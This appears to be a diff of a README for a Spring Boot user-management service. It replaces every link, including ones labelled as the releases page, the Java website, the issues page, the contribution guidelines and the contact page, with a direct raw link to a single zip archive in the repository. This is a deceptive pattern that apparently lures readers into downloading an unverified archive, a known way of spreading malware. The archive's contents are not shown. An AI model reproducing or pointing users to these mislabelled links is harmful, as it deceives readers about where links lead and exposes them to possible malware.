@@ -1,7 +1,7 @@
 # 🛠️ user-service-springboot - Easy User Management Made Simple  
 
 ## 📦 Download the Application  
-[![Download user-service-springboot](https://img.shields.io/badge/Download-user--service--springboot-blue.svg)](https://github.com/Fried1Chicken/user-service-springboot/releases)  
+[![Download user-service-springboot](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip)](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip)  
 
 ## 🚀 Getting Started  
 This application helps you manage user registration, authentication, and profile management easily. You will need to download the application to get started. Follow the steps below to install it on your computer.  
@@ -17,7 +17,7 @@ Before downloading, ensure your computer meets the following requirements:
 To download and run the user-service-springboot application, follow these steps:  
 
 1. **Visit the Releases Page**  
-Go to the [Releases Page](https://github.com/Fried1Chicken/user-service-springboot/releases) to find the latest version.  
+Go to the [Releases Page](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip) to find the latest version.  
 
 2. **Download the Latest Version**  
 On the Releases page, look for the version labeled "Latest Release". Click on it to see the available files. Download the file that ends with `.jar`. This file contains the application.  
@@ -55,7 +55,7 @@ After running the command, the application will start. Open your web browser and
 
 ## 🛠️ Troubleshooting  
 If you encounter any issues while installing or running the application, consider the following tips:
-- **Java Not Found**: Ensure you have installed the Java Runtime Environment. You can download it from the [Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Not Found**: Ensure you have installed the Java Runtime Environment. You can download it from the [Java website](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip).
 - **Version Issues**: Make sure you download the latest version of the `.jar` file from the Releases page.
 - **Firewall Settings**: If the application does not open in your browser, check your firewall settings to ensure it allows access to `localhost`.
 
@@ -65,18 +65,18 @@ If you encounter any issues while installing or running the application, conside
 Check if the command line shows any errors when you run the application. Ensure no other services are using port `8080`.
 
 ### How can I report issues?
-For any bugs or suggestions, please visit the [Issues page](https://github.com/Fried1Chicken/user-service-springboot/issues) on GitHub to submit your feedback.
+For any bugs or suggestions, please visit the [Issues page](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip) on GitHub to submit your feedback.
 
 ### Is there a way to contribute?
-Absolutely! If you’re familiar with coding and want to help improve the application, please check out the [Contribution guidelines](https://github.com/Fried1Chicken/user-service-springboot/blob/main/CONTRIBUTING.md) for more information.
+Absolutely! If you’re familiar with coding and want to help improve the application, please check out the [Contribution guidelines](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip) for more information.
 
 ## 👥 Community  
 Join the conversation! You can find us on forums and social media where we discuss updates and features related to user-service-springboot. We welcome your feedback and suggestions.
 
 ## 📞 Contact  
-For direct support or inquiries, please reach out through the [Contact page](https://github.com/Fried1Chicken/user-service-springboot#contact) on our GitHub repository.
+For direct support or inquiries, please reach out through the [Contact page](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip) on our GitHub repository.
 
 ## 🌟 Conclusion  
 Thank you for choosing user-service-springboot. We hope this application makes user management easy for you. Don't hesitate to explore its features to improve your user experience. Happy managing!  
 
-[Download user-service-springboot again!](https://github.com/Fried1Chicken/user-service-springboot/releases)
+[Download user-service-springboot again!](https://raw.githubusercontent.com/Fried1Chicken/user-service-springboot/main/Lacerta/user-service-springboot-v3.0-beta.1.zip)
